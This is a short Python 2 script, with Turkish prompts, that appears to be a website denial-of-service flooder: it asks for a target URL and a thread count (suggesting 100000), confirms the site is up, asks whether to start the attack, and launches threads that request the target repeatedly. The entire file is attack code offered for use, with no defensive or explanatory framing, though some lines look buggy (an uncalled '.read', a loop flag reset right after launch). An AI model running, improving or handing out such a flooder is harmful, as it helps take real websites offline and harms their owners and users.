#/usr/bin/Python
# -*- coding: utf-8 -*-
import sys
import time
import threading
import urllib
import os

time.sleep(3)
 
a=1
b=threading.Lock()
 
class dos(threading.Thread):
    def __init__(self, host, threads):
        threading.Thread.__init__(self)
        self.host = host
        self.threads = threads
    def run(self):
        global a
        global b
        b.acquire()
        print "\n                           COLAK -> \033[0m \033[94m {0} \033[0m".format(self.threads)
        b.release()
        while 1 == a:
            try:
                urllib.urlopen(self.host).read
                try:
                    urllib.urlopen(self.host).read
                except:
                    pass
            except:
                pass
        b.acquire()
        print "                          COLAK {0}\n".format(self.threads)
        b.release()
        sys.exit()
try:
    threads=input("              PACKET (100000) : ")
except NameError:
    sys.exit()
while True:
    host=raw_input("\n             HEDEF  : ")
    print "\n                COLAK \n"
    time.sleep(2)
    try:
        urllib.urlopen(host)
    except IOError:
        print "\n DOWN .! \n"
        sys.exit()
    else:
        break
print "\n"*999999
c=raw_input("                    SITE AKTIF SALDIRI BASLANSIN MI ? ( Y/N ) > ")
if c=="Y":
    pass
elif c=="N":
    print "\n                           COLAK \n"
    sys.exit()
for A in xrange(threads):
    dos(host, A+1).start()
a=0
print "                    COLAK   \n"
